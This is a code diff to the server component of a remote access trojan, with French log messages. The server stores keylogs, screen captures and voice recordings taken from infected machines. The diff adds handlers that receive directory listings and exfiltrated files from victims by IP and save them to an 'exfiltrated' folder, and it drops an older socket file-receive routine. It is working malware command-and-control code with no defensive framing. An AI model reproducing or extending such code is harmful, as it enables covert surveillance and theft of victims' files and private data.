@@ -20,8 +20,9 @@ DB_PATH = "../bdd/rat.db"
 KEYLOG_DIR = "keylogs"
 CAPTURE_DIR = "captures"
 VOICE_DIR = "voice"
+EXFIL_DIR = "exfiltrated"
 
-for directory in [KEYLOG_DIR, CAPTURE_DIR, VOICE_DIR]:
+for directory in [KEYLOG_DIR, CAPTURE_DIR, VOICE_DIR, EXFIL_DIR]:
     os.makedirs(directory, exist_ok=True)
 
 
@@ -129,6 +130,20 @@ def process_data(data, client_ip):
                 f.write(bytes.fromhex(file_data))
             print(f"[+] Fichier audio sauvegardé : {file_path}")
 
+        elif file_type == "listing":
+            print(f"[+] Fichiers listés depuis {client_ip} :\n{file_data}")
+
+        elif file_type == "exfil":
+            file_path = os.path.join(EXFIL_DIR, filename)
+            with open(file_path, "wb") as f:
+                f.write(bytes.fromhex(file_data))
+            print(f"[+] Fichier exfiltré reçu : {file_path}")
+
+
+
+
+
+
     # except json.JSONDecodeError as e:
     #     print(f"[Erreur] JSON invalide reçu de {client_ip} : {e}")
     #     print(f"[Debug] Données brutes : {repr(data)}")
@@ -136,32 +151,6 @@ def process_data(data, client_ip):
     except Exception as e:
         # print(f"[Erreur] lors du traitement des données : {e}")
         print("")
-
-
-
-def receive_file(conn, dest_dir, prefix):
-    header = conn.recv(128)
-    decoded = header.decode(errors="ignore")
-    if header.startswith(prefix.encode()):
-        parts = decoded.split(":")
-        if len(parts) >= 3:
-            filename = parts[1]
-            filesize = int(parts[2])
-            os.makedirs(dest_dir, exist_ok=True)
-            save_path = os.path.join(dest_dir, filename)
-            with open(save_path, "wb") as f:
-                received = 0
-                while received < filesize:
-                    chunk = conn.recv(min(4096, filesize - received))
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    received += len(chunk)
-            print(f"[+] Fichier reçu : {save_path}")
-        else:
-            print(f"[!] Erreur dans le header {prefix}")
-    else:
-        print(f"[!] Header inattendu (pas {prefix}) : {decoded}")
 
 
 
